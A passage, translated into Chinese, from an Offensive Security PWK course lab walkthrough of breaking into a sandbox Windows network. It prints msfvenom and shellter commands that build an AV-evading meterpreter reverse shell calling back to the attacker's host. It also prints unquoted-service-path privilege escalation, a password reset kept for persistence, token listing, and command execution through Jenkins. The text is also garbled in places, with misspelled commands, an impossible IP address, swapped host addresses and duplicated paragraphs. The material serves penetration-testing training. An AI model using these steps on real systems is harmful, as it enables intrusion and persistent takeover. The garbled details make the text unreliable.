+Zora 运行着 `OpenSSH_8.1p1`，它应该支持此功能。如果我们能让它工作，我们就可以通过在我们的 Kali 上运行的 SOCKS 代理获得对 `10.5.0/24` 内部网络的完全网络访问。由于我们只有访问 `met`，我们需要在 Zora 上创建一个新的 `ssh` key。首先，让我们在 Zora 上生成一个 `ssh` key。
+
+### 列表 955 - 生成 SSH 密钥
+
+PWK 2.0
+Copyright © Offensive Security Ltd. All rights reserved.
+
+```bash
+ssh-keygen
+Generating public key pair.
+Enter file in which to save the key (/var/lib/ssh/id_rsa):
+Enter passphrase (empty for no):
+Enter passphrase again:
+Created key /var/lib/ssh/id_rsa
+Public key has been saved in /var/lib/ssh/id_rsa.pub.
+```
+
+```bash
+ssh-rsa AAAAB3Nzac2EAAAABQQC4c...
+```
+
+
+
+### 列表 955 - 生成 SSH 密钥
+
+PWK 2.0
+Copyright © Offensive Security Ltd. All rights reserved.
+
+# 渗透安全
+www.offensive-security.com
+
+`3389/tcp` 开启 `ms-tcp-server`
+`5900/tcp` 关闭 `vnc`
+`8086/tcp` 关闭 `http-proxy`
+
+Nmap 扫描完成：扫描了 1 个 IP 地址（1 个主机）。Nmap 发现端口 135、139、445 和 3389 处于开启状态。然而，端口 53 是关闭的，而该端口在域控制器上通常是开启的。这很可能不是我们正在寻找的域控制器，但其他端口仍然表明这是一个 Windows 操作系统。前 20 个端口没有显示任何 HTTP 应用，因此让我们尝试通过发现的凭据通过 RDP 登录来“利用”这台机器。
+
+### 24.6.2 漏洞利用（或仅仅登录）
+
+现在我们有更大的把握确认该主机运行着 Windows，并且发现 RDP 是开启的，我们将使用 `xferdp` 连接到它。配合 Nmap，我们必须使用 `proxychains` 命令来准备 `xferdp`。我们通过 `/d:sandbox` 和 `/ualex` 标志提供域名和用户名。为了重定向剪贴板，我们将使用 `+clipboard` 标志，这将允许我们在 Poultry 之间复制和粘贴。最后，我们还将为主机提供 `/v:10.5.5.20`。
+
+```
+kali@kali:$ proxychains xferdp /d:sandbox /ualex /v:10.5.5.20 +clipboard
+
+Proxychains-3.1 (http://proxychains.sf.net)
+```
+
+`10.5.5.20:3389` (RDP-Server) 的证书详情：
+通用名称: POULTRY.local
+主题: CN = POULTRY.local
+发行者: CN = POULTRY.local
+指纹: 19:bc:64:c6:d9:a8:b7:78:d3:b4:fb:77:0c:1a:c6:d2:b0
+无法验证上述 X.509 证书，可能是因为你的证书库中没有 CA 证书，或者证书已过期。
+请参考 OpenSSL 文档了解如何向存储库添加私有 CA。
+你信任上述证书吗？(Y/T/N) Y
+密码：
+
+在初始连接期间，我们被提示接受证书。输入 "Y" 将证书添加到我们的信任存储库中。接下来，我们将被提示输入密码，这是我们在 `system_report.ps1` 脚本中的。
+
+# 凭据有效，我们看到了一个 Windows 7 桌面（图 342）。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_802_0.png)
+
+图 342：登录到 Poultry
+
+### 24.6.3 提后枚举
+
+经过短暂的调查，我们很快发现 Poultry 运行着 McAfee Endpoint Security。这意味着如果我们上传并使用任何恶意可执行文件，必须非常小心并确保规避杀毒软件 (AV)。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_803_0.png)
+
+我们将开始收集有关主机的基本信息，例如 Windows 的确切版本、主机名、本地用户、网络信息以及正在运行的服务。我们从运行 `systeminfo` 开始。
+
+```
+C:\Users\alex>systeminfo
+
+Host Name:           POULTRY
+
+OS Name:             Windows 7 Professional
+
+OS Version:          6.1.7601 Service Pack 1 Build 7601
+
+Registered Owner:    poultryadmin
+
+...
+
+Domain:              sandbox.local
+
+Logon Server:       \\SANDBOXDC
+```
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_804_0.png)
+
+热补丁(s)：
+
+| 类型 | 详情 |
+| :--- | :--- |
+| 已安装 186 个热补丁。 | |
+| [01] | KB2849967 |
+| [186] | KB4467107 |
+| 已安装 1 个网卡。 | |
+| [01] | Intel(R) PR100/1000 MT 网络连接 |
+| IP 地址(es) | |
+| [01] | 10.5.5.20 |
+| [02] | fe80:400a:ba3e:4ca5:6aa2 |
+
+网卡(s)：
+
+```
+C:\Users\alex>
+```
+
+列表 963 - Poultry 上的 `systeminfo`
+
+此命令的输出为我们提供了大量信息。首先，我们知道操作系统是 Windows 7 SP1 Build 7601。我们看到名为 "poultryadmin" 的本地用户，并且这台计算机已加入 "sandbox" 域。我们发现唯一的 ipv4 地址是 10.5.5.20。由于我们无法进行全端口扫描，让我们使用 `netstat` 命令查看哪些端口是开启的。
+
+```
+C:\Users\alex>netstat -ano
+```
+
+活动连接
+
+| 本地地址 | 远程地址 | 状态 | PID |
+| :--- | :--- | :--- | :--- |
+| TCP 0.0.0.0:135 | 0.0.0.0 | LISTENING | 820 |
+| TCP 0.0.0.0:445 | 0.0.0.0 | LISTENING | 4 |
+| TCP 0.0.0.0:1389 | 0.0.0.0 | LISTENING | 428 |
+| TCP 0.0.0.0:49152 | 0.0.0.0 | LISTENING | 524 |
+| TCP 0.0.0.0:49153 | 0.0.0.0 | LISTENING | 872 |
+| TCP 0.0.0.0:49154 | 0.0.0.0 | LISTENING | 364 |
+| TCP 0.0.0.0:49172 | 0.0.0.0 | LISTENING | 632 |
+| TCP 0.0.0.0:49173 | 0.0.0.0 | LISTENING | 640 |
+| TCP 10.5.5.20:139 | 0.0.0.0 | LISTENING | * |
+| UDP fe80:400a:ba3e:4ca5:6aa2:546 | * | * | 872 |
+
+```
+C:\Users\alex>
+```
+
+列表 964 - Poultry 上的 `netstat`
+
+虽然我们唯一的端口扫描只检查了前 20 个端口，但它仍然找到了所有感兴趣的端口。我们已经知道 139、445 和 3389 是开启的。端口 49152 及以上端口是 Windows 用于建立连接的临时端口，我们不需要担心它们。此时，我们还应该检查 `alex` 是否属于任何管理员组。
+
+```
+C:\Users\alex>net user /domain
+```
+
+
+
+该请求将在 `sandbox.local` 的域控制器上处理。
+
+用户名: `alex` (https://en.wikipedia.org/Ephemeral_port)
+
+全名: `alex`
+账户活动: 是
+密码过期:
+密码有效:
+密码最后修改时间:
+登录时间:
+工作时间:
+组组:
+脚本限制:
+登录限制:
+密码长度:
+允许登录:
+命令限制:
+主机限制:
+命令已完成。
+
+列表 965 - Poultry 上的 `net user`
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+## 攻击性安全
+`www.offensive-security.net`
+
+| VMware Alias Manager and Ticket Service | Auto |
+|---|---|
+| "C:\Program Files\VMware\VMware Tools\VMware\VGAuthService.exe" | VGAuthService |
+
+| VMware Tools | Auto |
+|---|---|
+| "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" | VMTools |
+
+列表 968 - 通过 `munic` 获取自动启动且非标准的服务
+
+现在我们有了一个更易管理的列表。我们首先注意到的一点是，Puppet Agent 的服务路径没有加引号。如果该服务在高权限用户的上下文中运行，未加引号的搜索路径可能会允许我们提升权限。为了找到哪个用户在运行该服务，我们将在菜单中搜索“Services”（服务）来打开服务列表。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_808_0.png)
+
+图 345: 找到服务应用程序
+
+现在我们可以打开服务并找到 Puppet Agent。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_809_0.png)
+
+图 344: 在服务中找到 Puppet Agent
+
+Puppet Agent 配置为以“Local System”（本地系统）运行。这是一个极好的消息，因为我们有了权限提升的路径。此时，下一步是检查 `C:\Puppet` 目录是否可写，因为这是我们利用未引号服务路径的要求。我们可以使用 `icls` 查看我们的权限情况。
+
+```
+C:\Users>icls "C:\Puppet"
+
+C:BUILTIN\Users:(W)
+
+BUILTIN\Administrators:(I) (F)
+
+BUILTIN\Administrators:(I) (CI) (IO) (F)
+
+NT AUTHORITY\SYSTEM:(I) (F)
+
+NT AUTHORITY\SYSTEM:(I) (CI) (IO) (F)
+
+BUILTIN\Users:(I) (CI) (RX)
+
+NT AUTHORITY\Authenticated Users:(I) (M)
+
+NT AUTHORITY\Authenticated Users:(I) (CI) (IO) (M)
+
+列表 969 - 检查 C:\目录的权限
+```
+
+根据列表 969，由于 `alex` 是 `Users` 组的，我们对 `C:\Puppet` 文件夹拥有写入权限。为了利用未引号的路径 `C:\Puppet\Current Version`，我们需要创建一个可以规避反病毒软件的反向 shell `Current.exe`，并将其放在 `C:\Puppet`。
+
+### 24.6.4 未引号搜索路径利用
+
+由于我们知道杀毒软件正在运行，我们将使用 `shellter` 将 `meterpreter` 载荷注入到一个 Windows 二进制执行文件中，希望这样可以绕过 McAfee。
+
+> 确保在 Kali 上已通过 Wine 安装了 `shellter`。如果需要，可以在 AV Evasion 模块中找到说明。
+
+首先，我们将创建一个名为 `poultry` 的目录并拷贝一个合法的二进制文件进去。我们选择的 Windows 二进制文件是 `whoami.exe`，作为一个已知且合法的工具，它被杀毒软件发现的概率较低。
+
+```
+kali@kali:~$ mkdir poultry
+
+kali@kali:# cp /usr/share/windows-resources/binaries/whoami.exe /poultry/
+
+kali@kali:~$ cd poultry/
+
+kali@kali:~$
+```
+
+拷贝二进制文件后，我们将生成一个与我们操作系统匹配的 `meterpreter` 载荷。Kali 的 IP 将在 `LHOST` 选项中指定，`LPORT` 选项将指定端口 80。选择端口 80 是希望于避免任何潜在的防火墙限制。我们将使用 `-e` 标记对二进制文件进行编码，并指定任意次数的编码迭代。最后，我们将使用 `-f` 标记以原始格式输出。该命令的输出将重定向到 `met.bin` 文件。
+
+```
+kali@kali:/poultry$ msfvenom -p windows/meterpreter/reverse_tcp LHOST:10.11.0.4 LPORT 80 -e x86/shika_ga_nai -f raw met.bin
+
+[-] No payload was selected, choosing Msf::Windows from the payload
+
+[-] No arch selected, selecting each from the payload
+
+Found compatible encoders
+
+Attempting to encode payload with 7 iterations of x86/shika_ga_nai succeeded with size 368 (iteration=0)
+
+x86/shika_ga_nai succeeded with size 395 (iteration=1)
+
+x86/shika_ga_nai succeeded with size 222 (iteration=2)
+
+x86/shika_ga_nai succeeded with size 449 (iteration=3)
+
+x86/shika_ga_nai succeeded with size 476 (iteration=4)
+
+x86/shika_ga_nai succeeded with size 503 (iteration=5)
+
+x86/shika_ga_nai succeeded with size 530 (iteration=6)
+
+Payload size: 530 bytes
+```
+
+列表 971 - 生成 `meterpreter` shell
+
+有了载荷，我们现在可以使用 `shellter` 将其动态注入 `whoami.exe` 中。为了启动，我们将在 Kali 命令行中使用 `shellter`。`shellter` 会提示我们选择自动或手动模式。我们将选择“A”自动模式。
+
+```
+Choose Operation Mode - Auto/Manual (A/M): A
+
+Target: /home/kali/poultry/whoami.exe
+
+***
+
+* Backup
+
+Backup: Shellter_Backups\whoami.exe...
+
+Time Approx: 0.24 mins.
+```
+
+列表 972 - 将 `meterpreter` 注入 `whoami` binary
+
+在输入二进制文件路径后，`shellter` 对文件进行备份。我们现在被提示启用 Stealth Mode（隐藏模式），我们将跳过它，因为在执行载荷后我们不需要 `whoami` 二进制文件正常运行。接下来，提示我们选择载荷。
+
+```
+Enable Stealth Mode? (Y/N): N
+
+***
+
+* Payloads
+
+[1] Meterpreter_Reverse_TCP
+
+[2] Meterpreter_Reverse_HTTP
+
+[3] Meterpreter_Reverse_HTTPS
+
+[4] Meterpreter_Bind_TCP
+
+[5] Shell_Reverse_TCP
+
+[6] Shell_Bind_TCP
+
+[7] WinExec
+
+Use a listed payload or custom? (L/C): C
+```
+
+我们将使用用 `msfvenom` 生成的自定义（C）载荷。
+
+```
+Select Payload: /home/kali/poultry/met.bin
+Is payload a reflective DLL loader? (Y/N): N
+
+***
+
+* Payload Info
+
+...
+
+Injection: Verified!
+
+Press [Enter] to continue...
+```
+
+
+
+### 列表 974 - 将 meterpreter 注入 whoami binary
+
+在提示“Select Payload”（选择载荷）时，我们提供生成载荷的完整路径。最后，shellter 将询问此载荷是否为反射 DLL 加载器，在这种情况下不是。载荷随后将注入二进制文件，shellter 将向我们提供“Injection: Verified”（注入成功）的消息。
+
+PE 已成功后门，我们可以将 `whoami.exe` 传输到 poultry 并将其放在正确的位置。为了传输二进制文件，我们将再次使用 python 中的 `http.server` 模块。
+
+```
+kali@kali:~$ sudo python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+当 http 服务器启动时，我们可以通过在 Internet Explorer 中打开 Kali IP 来访问。如果成功，我们将看到 whoami 二进制文件并进入 met-bin 载荷。点击 `whoami.exe` 链接将显示下载提示，我们可以选择“保存”。保存后，我们可以在用户目录下找到该二进制文件。
+
+图 348: 查看下载的二进制文件
+
+下载完成后，我们将二进制文件重命名为 `Current.exe` 并将其拷贝到 `C:\Puppet`。这将确保在 Windows 尝试启动服务执行真实二进制文件之前，该二进制文件会被执行。
+
+图 349: 将 whoami.exe 拷贝到 Puppet
+
+接下来，我们需要使用之前生成载荷的配置启动 `msfconsole`，以捕获我们的反向 shell。我们还会指示 Metasploit 将 shell 迁移到另一个进程，并确保即使 Windows 认为服务启动失败，shell 也具有 `AutoRunScript migrate`。为了做到，我们将在 meterpreter 会话开始时将 `migrate` 设置为新进程。
+
+```
+kali@kali:~$ sudo msfconsole -q "use exploit/multi/handler;
+
+    set PAYLOAD windows/meterpreter/reverse_tcp;
+
+    set AutoRunScript post/windows/manage/migrate;
+
+    set LHOST 10.11.0.4;
+
+    set LPORT 80;
+
+    run"
+```
+
++ [* Started TCP handler on 10.11.0.40
+
+### 列表 976 - 启动 shell
+
+一切就绪后，我们将尝试重启 Poultry 机器并等待我们的反向 shell。为了拥有持久性后门，我们将使用 `net user` 重置 poultry 的密码（我们之前识别的本地管理员用户）。由于 shell 将以 SYSTEM 权限运行，重置密码时应该没有问题。
+
+```
+C:\Windows\system2>whoami
+
+nt authority\system
+
+C:\Windows\system2>net user poultryadmin OffSecHax1!
+
+The command completed successfully.
+
+C:\Windows\system2>
+```
+
+### 列表 977 - 获取系统 shell
+
+密码更改后，我们可以尝试远程桌面登录。这不需要 `/f` 标记，因为我们是以本地管理员用户登录的。
+
+```
+kali@kali:~$ proxychains freerdp /u:poultryadmin /v:10.11.0.5.20 +clipboard
+
+ProxyChains-3.1 (http://proxychains.net)
+
+[16:16:47:626] [INFO][com.freerdp.client.common.cmdline] - loading channelX clippdr
+```
+
+| S-chain |<->127.0.0.1:1880--<->10.5.5.20:3389--<->-OK
+密码:
+
+### 列表 978 - 以 poultryadmin 登录 xFreeRDP
+
+登录工作站后，我们看到了 poultryadmin 的桌面。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_815_0.png)
+
+拥有 Poultry 的管理员权限后，我们可以开始寻找访问域控制器的访问方法。
+
+#### 24.6.5 渗透后枚举
+
+在获得管理员权限后，我们想要尝试的第一项枚举是列出任何登录用户的域令牌（domain tokens）。由于我们重启了 Windows，我们预计不会发现很多东西，但检查一下仍然是个好主意。
+
+要列出令牌，我们将使用 meterpreter 的 `incognito` 扩展。回到 Meterpreter shell，我们可以加载 `incognito` 扩展并按用户名 `-u` 列出令牌。
+
+> 743 (Offensive Security, 2020), https://www.offensivesecurity.com/metasploit-unleashed/fun-incognito/
+
+```
+meterpreter > use incognito
+
+Loading extension incognito....Success.
+```
+
+```
+meterpreter > list_tokens -u
+```
+
+```
+Delegation Tokens Available
+
+=============================
+
+NT AUTHORITY\LOCAL SERVICE
+
+NT AUTHORITY\NETWORK SERVICE
+
+NT AUTHORITY\SYSTEM
+
+poultry\poultryadmin
+```
+
+```
+Impersonation Tokens Available
+
+=============================
+
+NT AUTHORITY\ANONYMOUS LOGON
+```
+
+```
+meterpreter >
+```
+
+### 列表 979 - 使用 incognito 导出令牌
+
+遗憾的是，这并没有给我们提供任何我们没有的权限。
+
+我们可以继续观察一下。我们看到也安装了 Thunderbird，但没有为管理员用户设置。我们可以通过导航 `C:\Users\Alex\AppData\Roaming\Thunderbird\Profiles\jbv4ndsh.default-release\Mail\mail.sandbox.local\Inbox` 来检查 Alex 的邮箱。邮件内容只是在抱怨 Alex 使用了旧版本的 Windows。
+
+> - 周三 2019年11月13日 17:05:33
+X-Account-Key: account1
+...
+Reply-To: admin@sandbox.local
+X-Priority: 3
+To: alex@sandbox.local
+Content-type: text/plain; charset=iso-8859-1
+
+Alex，
+我知道你不喜欢 Windows 10，但我们很快需要让大家都过渡过去。此外，你的电脑太旧了，我们甚至不知道上面在运行什么，以及它是否还在进行更新。
+-Roger
+
+### 列表 980 - 读取 Alex 的邮件
+
+#### 24.7 内部网络枚举
+
+在开始枚举内部网络之前，让我们回顾一下已经知道的知识：
+
+我们知道 Ajax 在位于防火墙后的内部网络中。我们也知道 Zara 和 Poultry 在内部网络的防火墙后面，但我们不知道整个内部网络是什么样的。为了找到答案，我们必须运行扫描。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_817_0.png)
+
+图 351：带有未知内部网络的网络图
+
+为了有效地枚举内部网络，我们必须首先开发一种扫描方法。运行全端口扫描并不是一种有效的方法。如所述，ICMP 发现无法通过 proxchains 隧道工作。相反，我们可以尝试使用被攻破的主机发现哪些主机，并使用这些信息进行调查。
+
+请注意，这只会执行 ping 扫描（sweep）。这意味着我们不能假设结果是完整的，因为可能存在不响应 ICMP 数据包的主机。
+
+```
+Users@root:~$ for i in (1,255) do ping -n 1 -w 200 10.5.5.%i > /dev/null && echo 10.5.5.%i is up.
+
+10.5.5.11 is up.
+
+10.5.5.20 is up.
+
+10.5.5.25 is up.
+
+10.5.5.30 is up.
+```
+
+### 列表 981 - 内部网络 扫描
+
+扫描发现了五个主机，包括网关，我们可以暂时忽略它。另外两个已经攻破了（10.5.5.11 和 10.5.5.20）。还剩下两个感兴趣的主机。我们将对这些主机进行 1000 端口的 Nmap 扫描。
+
+
+
+`kal@kali:~$ proxychains nmap --top-ports=1000 -sT -Pn 10.5.5.25,30`
+
+Starting Nmap 7.8 ( http://nmap.org ) at 2019-02-12 19:00
+
+[S-chain]-127.0.0.1:1080<10.5.5.25:5900>timeout
+
+[S-chain]-127.0.0.1:1080<10.5.5.30:5900>timeout
+
+[S-chain]-127.0.0.1:1080<10.5.5.25:53>timeout
+
+[S-chain]-127.0.0.1:1080<10.5.5.25:4321>timeout
+
+[S-chain]-127.0.0.1:1080<10.5.5.30:667>timeout
+
+[S-chain]-127.0.0.1:1080<10.5.5.25:667>timeout
+
+Nmap scan report for 10.5.5.25
+
+Host is up (0.8s latency).
+
+Not shown: 998 closed
+
+PORT     STATE SERVICE
+
+53/tcp open domain
+
+88/tcp open kerberos-sec
+
+135/tcp open ms-rpc
+
+139/tcp open netbios
+
+389/tcp open ldap
+
+445/tcp open microsoft-ds
+
+464/tcp open postfix
+
+593/tcp open http-rpc
+
+3268/tcp open globalLDAP
+
+3269/tcp closed globalLDAP
+
+3389/tcp open ms-rpc-server
+
+```
+```
+
+Nmap scan report for 10.5.5.30
+
+Host is up (0.8s latency).
+
+Not shown: 996 closed
+
+PORT     STATE SERVICE
+
+135/tcp open ms-rpc
+
+139/tcp open netbios
+
+445/tcp open microsoft-ds
+
+8080/tcp open http-proxy
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 15 seconds
+
+```
+
+### 列表 982 - 对两个主机进行 Nmap 扫描
+
+扫描完成后，我们可以进行调查。
+
+### 24.7.1 查看结果
+
+首先，让我们关注 `10.5.5.30`。一看，这似乎是 `sandbox.local` 的域控制器。现在我们知道了哪些端口是开放的，可以使用默认 Nmap 脚本 (`-sC`) 对它们进行更深层的扫描，尝试提取更多信息。
+
+```
+kal@kali:~poultry$ proxychains nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sC -sT -Pn 10.5.5.30
+```
+
+```
+Nmap scan report for 10.5.5.30
+
+Host is up (0.29s latency).
+
+PORT     STATE SERVICE
+
+53/tcp open domain
+
+88/tcp open kerberos-sec
+
+135/tcp open msrpc
+
+139/tcp open netbios
+
+389/tcp open ldap
+
+445/tcp open microsoft-ds
+
+464/tcp open postfix
+
+593/tcp open http-rpc
+
+636/tcp open ldaps
+
+3268/tcp open globalLDAP
+
+3269/tcp closed globalLDAP
+
+3389/tcp open ms-rpc-server
+```
+
+
+
+| rdp-ntlm-info: |
+|---|---|
+| Target_Name | sandbox |
+| NetBIOS_Domain_Name | SANDBOX |
+| NetBIOS_Computer_Name | sandbox.local |
+| DNS_Domain_Name | sandbox.local |
+| DNS_Computer_Name | SANDBOX.sandbox.local |
+| DNS_Tree_Name | sandbox.local |
+| Product_Version | 10.0.14393 |
+| System_Time | 2019-12-17T01:36:29+00:00 |
+| Subject | CommonName=SANDBOX.sandbox.local |
+| Not valid before | 2019-11-25T06:48:49 |
+| Not valid after | 2020-05-26T06:48:49 |
+| ssl_date | 2019-12-17T10:36:28+00:00(+8h001s from scanner time. |
+
+| Host script results: |
+|---|---|
+| clock_skew | mean: 9h3m0s, deviation: 3h34m2s, median: 8h0m0s |
+| smb-os-discovery | OS: Windows 10 15063 (Windows 10 6.3) OS CPE: cpe:/o:microsoft:windows_10::| Computer name: CEVAPI NetBIOS computer: SANDBOX Domain name: sandbox.local Forest name: sandbox.local FQDN: CEVAPI.sandbox.local System time: 2019-12-17T15:03:48+00:00 smb-security-mode: account_used: guest authentication-level: user challenge_response: supported message_signed: disabled (dangerous, but default) smb2-security-mode: 2.0.2. Message signing enabled but not required smb-time: date: 2019-12-17T23:23:37 start_date: 2020-01-01T22:07:03 |
+
+# 攻击性安全
+
+可以通过打开 Firefox 选项并搜索“proxy”（代理）来实现。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_821_0.png)
+
+图 352：正在查找代理设置
+
+应取消勾选“所有协议都使用此代理服务器”选项，并将 SOCKS 主机设置为 127.0.0.1，端口设置为 1080。最后，我们将点击 SOCKS v4 单选按钮并点击确定。
+
+# 网络设置
+
+配置 Firefox 代理连接互联网。了解更多
+
+# 配置代理访问互联网
+
+- 不使用代理
+- 自动检测此网络的代理设置
+- 使用系统代理设置
+- 手动代理配置
+
+| HTTP 代理 | 端口 | 0 |
+| :--- | :--- | :--- |
+| SSL 代理 | 端口 | 0 |
+| ETP 代理 | 端口 | 0 |
+| SOCKS 主机 | 127.0.0.1 | 端口 | 1080 |
+
+- 所有协议都使用此代理服务器
+- SOCKS v4
+- SOCKS v5
+- 自动代理配置 URL
+
+示例：.mozilla.org, .net.nz, 192.168.1.0/24
+- 如果保存了密码，则不提示验证
+- 使用 SOCKS v5 时代理 DNS
+- 启用通过 HTTPS 的 DNS
+
+![](img/f99f528ca9845f4c256ce54e882b1345_822_0.png)
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+接下来，我们将打开 Offensive Sec 新标签页并访问 `http://10.5.5.25:8080`
+
+![](img/f99f528ca9845f4c256ce54e882b1345_823_0.png)
+
+# 欢迎使用 Jenkins!
+
+用户名
+密码
+登录
+
+保持登录状态
+
+![](img/f99f528ca9845f4c256ce54e882b1345_823_1.png)
+
+图 354：访问端口 8080  10.5.5.25
+
+打开的页面是 Jenkins 登录页面。这是一个非常有的目标，因为 Jenkins 是一个极其强大的软件，可能会暴露一些攻击面。因此，接下来我们将把精力集中在这个主机上。
+
+## 24.8 目标：Jenkins
+
+Jenkins 是一个自动化服务器，可用于自动化许多与软件开发相关的任务。由于其本质性，像 Jenkins 这样的持续集成和交付工具通常能够执行代码。为了使用由特定事件或操作触发的自定义可重复任务，这种能力是必要的。
+
+Jenkins 这类工具的常见用途是在推送提交（commit）后拉取 git 仓库，运行一系列测试以确保更改期间没有损坏应用程序，如果一切顺利，则将代码合并到 master 分支。为了实现这一点，Jenkins 需要具备以下能力
+
+> 745（维基百科，2019），https://en.wikipedia.org/wiki/Jenkins_(software)
+> 746（持续交付基金会，2020），https://jenkins.io/doc/
+
+来执行系统命令。作为渗透测试员，访问 Jenkins 将为我们提供代码执行的路径。
+
+一如既常，在开始尝试利用任何东西之前，我们想要进行某种程度的枚举。我们已经通过端口扫描进行了网络枚举，但现在我们只想专门关注 Jenkins 应用程序本身。
+
+### 24.8.1 应用程序枚举
+
+首先，我们可以通过查看 Jenkins 登录页的文档对象模型（DOM）开始枚举。稍后我们还会查看 HTML 源代码，因为它可能与 DOM 不同。要查看 DOM，请右键点击页面并选择“检查元素”。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_824_0.png)
+
+图 355：检查元素
+
+# 攻击性安全
+www.offensive-security.com
+
+使用 Kali Linux 2.0 进行渗透测试
+
+在 Firefox 开发工具窗口中，右键点击顶部的 HTML 标签并选择“全部展开”。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_825_0.png)
+
+图 356：展开 DOM
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。826
+
+# 攻击性安全
+www.offensive-security.com
+
+使用 Kali Linux 2.0 进行渗透测试
+
+查看 DOM 没有显示任何信息。我们可以看到页面是一个基础 HTML 表单。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_826_0.png)
+
+接下来，我们将查看源代码，看看是否隐藏了什么。
+
+# 攻击性安全
+www.offensive-security.com
+
+使用 Kali Linux 2.0 
+
+要这样做，右键点击页面任意位置并选择“查看源代码”。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_827_0.png)
+
+图 358：Jenkins 
+
+DOM 视图没有显示任何信息。我们可以看到页面是一个基础 HTML 表单。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_828_0.png)
+
+接下来，我们将查看源代码，看看是否隐藏了什么。
+
+# 攻击性安全
+www.offensive-security.com
+
+使用 Kali Linux 2.0 
+
+虽然通过查看源代码可以发现某些信息，但在这里似乎并不是这样。源代码看起来非常相似。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_829_0.png)
+
+接下来，我们将运行 `dirb` 扫描来发现任何隐藏文件。Jenkins 在我们未登录时会响应为 403，这对于任何目录都是如此。
+
+因此，我们将使用 `-w` 标志来进行扫描。
+
+```
+kali@kali~$ proxychains dirb http://10.5.5.25:8080/ -w
+
+----------------------
+
+TARGET          http://10.5.5.25:8080/
+
+WORDLIST         :/usr/share/dirb/wordlists/common.txt
+
+[OK] 200          http://10.5.5.25:8080/
+
+[NOT FOUND] 404 http://10.5.5.25:8080/admin
+```
+
+
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/backup`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/config`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/data`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/db`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/db.php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/index.php`
+
+[VULNABLE] 200 `http://10.5.5.25:8080/favicon.ico`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/logs`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/main.php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/menu.php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/old`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/old.php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/phpmyadmin`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/test`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/test.php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/user`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/user.php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/users`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/users.php`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/www`
+
+[NOT FOUND] 404 `http://10.5.5.25:8080/www.php`
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。826
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+我们将选择“添加构建步骤”（Add build step），并在下拉菜单中选择“执行 Windows 批命令”（Execute Windows batch command）。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_833_0.png)
+
+图36 选择“执行 Windows 批命令”
+
+当*Command*文本框出现时，我们将输入“`whoami`”。之后我们将将其更改为想要执行的其他命令。在文本框中输入命令后，点击“保存”（Save）。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_834_0.png)
+
+Jenkins 将打开该项目的主页。在这里，我们可以选择*立即构建*（Build Now）来运行命令。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_834_1.png)
+
+当构建执行时，一个新的项目将显示*构建历史*（Build History）下。
+
+点击“#1”将打开构建页面。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_835_0.png)
+
+图366：Whoami 构建完成
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+从构建页面，我们可以选择“控制台输出”（Console Output）来查看命令的输出。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_836_0.png)
+
+图367：打开 Jenkins 构建
+
+这将打开“控制台输出”页面，显示 말미 命令的输出。
+
+### 控制台输出
+
+Started by user admin
+Running as SYSTEM
+Building in workspace C:\Program Files (x86)\Jenkins\workspace\Access
+[Access] $ cmd /c C:\Users\Jenkins-1\AppData\Local\Jenkins651510271122527323189.bat
+
+```
+C:\Program Files (x86)\Jenkins\workspace\Access>whoami
+
+cevapi\jenkinsinser
+
+C:\Program Files (x86)\Jenkins\workspace\Access>exit 0
+
+Finished: SUCCESS
+```
+
+图368：查看 whoami 构建控制台输出
+
+根据 Jenkins 的显示，代码是以 `cevapi\jenkinsinser` 账户运行的。有了这些信息，我们可以开始尝试获取一个 metpreter shell。
+
+可以假设，由于 Poultry 使用了反病毒软件，Cevapi 也会一样。我们应该能够使用之前生成的 `whoami` 后门 shell，并尝试在 Cevapi 上获取 metpreter shell。我们首先需要设置一个 Web 服务器来下载 shell，使用 Jenkins 下载该 shell，在 Kali 上启动 metasploit 监听器，最后使用 Jenkins 运行后门可执行文件。
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
